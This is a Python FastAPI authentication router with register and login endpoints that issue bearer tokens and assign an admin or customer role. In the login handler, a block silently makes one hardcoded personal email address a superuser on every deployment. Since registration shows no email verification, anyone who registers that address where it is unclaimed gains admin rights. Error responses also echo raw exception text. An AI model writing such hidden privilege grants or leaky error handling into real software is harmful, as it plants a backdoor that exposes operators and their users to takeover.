from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.orm import Session
from datetime import timedelta
from .. import database, models, utils, schemas
from ..config import get_settings

router = APIRouter(
    prefix="/auth",
    tags=["auth"]
)

settings = get_settings()

@router.post("/register", response_model=schemas.UserOut)
def register(user: schemas.UserCreate, db: Session = Depends(database.get_db)):
    try:
        db_user = db.query(models.User).filter(models.User.email == user.email).first()
        if db_user:
            raise HTTPException(status_code=400, detail="Email already registered")
        
        db_username = db.query(models.User).filter(models.User.username == user.username).first()
        if db_username:
            raise HTTPException(status_code=400, detail="Username already taken")
        
        hashed_password = utils.get_password_hash(user.password)
        
        new_user = models.User(
            email=user.email,
            username=user.username,
            hashed_password=hashed_password,
            notification_email=True,
            notification_sms=False,
            is_active=True,
            is_superuser=False
        )
        db.add(new_user)
        db.commit()
        db.refresh(new_user)
        return new_user
    except HTTPException:
        raise
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Internal Server Error: {str(e)}")

@router.post("/login", response_model=schemas.Token)
def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(database.get_db)):
    user = db.query(models.User).filter(models.User.username == form_data.username).first()
    if not user or not utils.verify_password(form_data.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Auto-elevate specific user to admin across deployments
    if user.email == "mahipatel2628@gmail.com" and not user.is_superuser:
        user.is_superuser = True
        db.commit()
        db.refresh(user)

    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = utils.create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    role = "admin" if user.is_superuser else "customer"
    return {"access_token": access_token, "token_type": "bearer", "role": role}
